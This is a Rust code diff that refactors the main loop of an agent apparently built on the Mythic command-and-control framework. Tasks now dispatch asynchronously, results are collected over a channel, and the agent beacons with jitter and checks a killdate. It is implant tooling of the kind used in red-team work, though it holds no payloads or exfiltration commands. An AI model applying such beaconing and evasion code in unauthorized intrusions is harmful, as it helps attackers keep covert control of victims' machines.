@@ -1,7 +1,8 @@
 use core::sync::atomic::Ordering;
 use std::panic::catch_unwind;
+use std::sync::mpsc::{self, Receiver, RecvTimeoutError, Sender};
 use std::thread::sleep;
-use std::time::Duration;
+use std::time::{Duration, Instant};
 
 use mythic::{
     Aes256HmacCrypto, AgentMessageExtras, AgentResponseExtras, C2Transport, MythicAgent,
@@ -22,6 +23,11 @@ use crate::{
 
 // ── Helpers ─────────────────────────────────────────────
 
+struct CompletedTask {
+    command: String,
+    responses: Vec<TaskResponse>,
+}
+
 /// Dispatch a task, catching panics so one bad handler can't crash the agent.
 fn safe_dispatch(task: &mythic::TaskMessage) -> TaskResponse {
     let t = task.clone();
@@ -38,6 +44,14 @@ fn safe_dispatch_with_extras(task: &mythic::TaskMessage) -> Vec<TaskResponse> {
     out.push(primary);
     out.extend(extras);
     out
+}
+
+fn dispatch_async(task: mythic::TaskMessage, completed_tx: Sender<CompletedTask>) {
+    std::thread::spawn(move || {
+        let command = task.command.clone();
+        let responses = safe_dispatch_with_extras(&task);
+        let _ = completed_tx.send(CompletedTask { command, responses });
+    });
 }
 
 fn get_agent<C: C2Transport>(payload_uuid: Uuid, c2s: &[C]) -> MythicResult<MythicAgent> {
@@ -183,10 +197,10 @@ fn maybe_exit_process() {
     }
 }
 
-fn sleep_with_jitter() {
+fn next_beacon_delay() -> Duration {
     let interval = INTERVAL.load(Ordering::Acquire);
     if interval == 0 {
-        return;
+        return Duration::ZERO;
     }
     // JITTER is a percentage (0–100): extra sleep = interval * jitter% * random
     let jitter_pct = JITTER.load(Ordering::Acquire).min(100);
@@ -196,13 +210,63 @@ fn sleep_with_jitter() {
         0.0
     };
     let total_sleep = interval as f64 + jitter_secs;
+    Duration::from_secs_f64(total_sleep.max(0.0))
+}
 
-    // Sleep in 60-second chunks so killdate is checked reasonably often
-    let mut remaining = (total_sleep as u64).max(1);
-    while remaining > 0 && !past_killdate() {
-        let chunk = remaining.min(60);
-        sleep(Duration::from_secs(chunk));
-        remaining -= chunk;
+fn handle_completed_task(
+    completed: CompletedTask,
+    pending: &mut Vec<TaskResponse>,
+    next_tasking_at: &mut Instant,
+) {
+    if completed.command == "sleep" {
+        *next_tasking_at = Instant::now() + next_beacon_delay();
+    }
+    pending.extend(completed.responses);
+}
+
+fn post_ready_responses<C: C2Transport, R: rand::Rng + ?Sized>(
+    mythic: &MythicAgent,
+    profiles: &[C],
+    rng: &mut R,
+    pending: &mut Vec<TaskResponse>,
+) -> MythicResult<()> {
+    if pending.is_empty() {
+        return Ok(());
+    }
+    let c2 = profiles.choose(rng).unwrap();
+    post_pending_until_drained(mythic, c2, pending)
+}
+
+fn wait_for_responses_until<C: C2Transport, R: rand::Rng + ?Sized>(
+    mythic: &MythicAgent,
+    profiles: &[C],
+    rng: &mut R,
+    completed_rx: &Receiver<CompletedTask>,
+    pending: &mut Vec<TaskResponse>,
+    next_tasking_at: &mut Instant,
+) -> MythicResult<()> {
+    loop {
+        while let Ok(completed) = completed_rx.try_recv() {
+            handle_completed_task(completed, pending, next_tasking_at);
+        }
+
+        post_ready_responses(mythic, profiles, rng, pending)?;
+
+        if SHOULD_EXIT.load(Ordering::Acquire)
+            || past_killdate()
+            || Instant::now() >= *next_tasking_at
+        {
+            return Ok(());
+        }
+
+        let timeout = next_tasking_at
+            .saturating_duration_since(Instant::now())
+            .min(Duration::from_secs(60));
+        match completed_rx.recv_timeout(timeout) {
+            Ok(completed) => handle_completed_task(completed, pending, next_tasking_at),
+            Err(RecvTimeoutError::Timeout) => {}
+            Err(RecvTimeoutError::Disconnected) => return Ok(()),
+        }
     }
 }
 
@@ -271,27 +335,25 @@ pub fn run(config: Config) -> MythicResult<()> {
 
     let mut rng = rand::thread_rng();
     let mut pending: Vec<TaskResponse> = Vec::new();
-
-    // First round: jitter then pure get_tasking
-    sleep_with_jitter();
-    let c2 = profiles.choose(&mut rng).unwrap();
-    let tasking = get_tasking_with(&mythic, 5, c2, Vec::new())?;
-    if DEBUG.load(Ordering::Relaxed) {
-        info!("task: {:?}", tasking);
-    }
-    for t in &tasking.tasks {
-        pending.extend(safe_dispatch_with_extras(t));
-    }
-    if SHOULD_EXIT.load(Ordering::Acquire) {
-        let c2 = profiles.choose(&mut rng).unwrap();
-        flush_pending(&mythic, c2, pending);
-        maybe_exit_process();
-        info!("[*] agent exited (thread)");
-        return Ok(());
-    }
+    let (completed_tx, completed_rx) = mpsc::channel::<CompletedTask>();
+    let mut next_tasking_at = Instant::now() + next_beacon_delay();
 
     loop {
-        // Check killdate each cycle
+        if let Err(e) = wait_for_responses_until(
+            &mythic,
+            &profiles,
+            &mut rng,
+            &completed_rx,
+            &mut pending,
+            &mut next_tasking_at,
+        ) {
+            if DEBUG.load(Ordering::Relaxed) {
+                eprintln!("[!] post_response failed: {e}");
+            }
+            next_tasking_at = Instant::now() + Duration::from_secs(5);
+            continue;
+        }
+
         if past_killdate() {
             println!("[*] past killdate, exiting");
             let c2 = profiles.choose(&mut rng).unwrap();
@@ -300,38 +362,30 @@ pub fn run(config: Config) -> MythicResult<()> {
             return Ok(());
         }
 
-        sleep_with_jitter();
-        let c2 = profiles.choose(&mut rng).unwrap();
-
-        if let Err(e) = post_pending_until_drained(&mythic, c2, &mut pending) {
-            if DEBUG.load(Ordering::Relaxed) {
-                eprintln!("[!] post_response failed: {e}");
-            }
-            sleep(Duration::from_secs(5));
-            continue;
+        if SHOULD_EXIT.load(Ordering::Acquire) {
+            let c2 = profiles.choose(&mut rng).unwrap();
+            flush_pending(&mythic, c2, pending);
+            maybe_exit_process();
+            info!("[*] agent exited (thread)");
+            return Ok(());
         }
 
+        let c2 = profiles.choose(&mut rng).unwrap();
         match get_tasking_with(&mythic, 5, c2, Vec::new()) {
             Ok(tasking) => {
                 if DEBUG.load(Ordering::Relaxed) {
                     info!("task: {:?}", tasking);
                 }
-                for t in &tasking.tasks {
-                    pending.extend(safe_dispatch_with_extras(t));
+                for t in tasking.tasks {
+                    dispatch_async(t, completed_tx.clone());
                 }
-                if SHOULD_EXIT.load(Ordering::Acquire) {
-                    let c2 = profiles.choose(&mut rng).unwrap();
-                    flush_pending(&mythic, c2, pending);
-                    maybe_exit_process();
-                    info!("[*] agent exited (thread)");
-                    return Ok(());
-                }
+                next_tasking_at = Instant::now() + next_beacon_delay();
             }
             Err(e) => {
                 if DEBUG.load(Ordering::Relaxed) {
                     eprintln!("[!] get_tasking failed: {e}");
                 }
-                sleep(Duration::from_secs(5));
+                next_tasking_at = Instant::now() + Duration::from_secs(5);
             }
         }
     }
